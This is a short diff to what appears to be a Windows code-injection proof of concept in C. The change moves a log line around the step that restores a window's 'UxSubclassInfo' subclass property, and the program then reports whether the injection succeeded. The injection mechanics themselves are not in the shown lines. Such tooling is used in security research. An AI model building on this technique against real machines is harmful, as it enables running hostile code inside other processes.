@@ -118,13 +118,11 @@ int main(void){
               PostMessage(hWnd, WM_CLOSE, 0, 0);
               
               // 13. Restore original subclass header
+              wprintf(L"[+] Restoring subclass header.\n");
               SetProp(hWnd, L"UxSubclassInfo", hProp);
               
               wprintf(L"[+] Waiting for signal.\n");
               evt=WaitForSingleObject(hEvent,5*1000);
-              
-              wprintf(L"[+] Restoring subclass header.\n");
-
               
               wprintf(L"[+] Code injection %s.\n", 
                 evt==0?L"successful":L"failed");
